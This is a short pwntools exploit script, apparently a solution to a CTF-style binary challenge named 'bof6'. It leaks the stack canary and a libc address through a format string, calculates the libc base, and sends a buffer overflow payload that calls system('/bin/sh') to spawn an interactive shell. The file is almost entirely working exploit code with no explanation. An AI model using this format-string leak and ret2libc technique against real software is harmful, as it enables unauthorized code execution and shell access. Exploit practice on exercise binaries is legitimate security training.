from pwn import *


offset = 64
canary = "%11$x-%12$p"

b = ELF('./bof6')
libc = ELF('./libc.so.6')

p = process('./bof6', env={"LD_PRELOAD" : "./libc.so.6"})
print p.recvline()
p.sendline(canary)

leak = p.recvline().split(' ')[3].replace('\n','')
somelibcleak = leak.split('-')[1]
canaryleak = leak.split('-')[0]

log.info("Canary leak : " + canaryleak)
log.info("somelibcleak : " + somelibcleak)
log.info("Libc Start : " + hex(b.symbols['__libc_start_main']))

print p.recv()
print util.proc.pidof(p)
gdb.attach(p,'''
b *0x0804859d
b *main+216
''')

pause()
libc.address = int(somelibcleak,16) - 0x1b23dc
p.sendline("A"*64 + p32(int(canaryleak,16)) + "B"*12 + p32(libc.symbols['system']) + p32(0xcafebabe) + p32(next(libc.search('/bin/sh'))))
p.interactive()
# print p.recv()
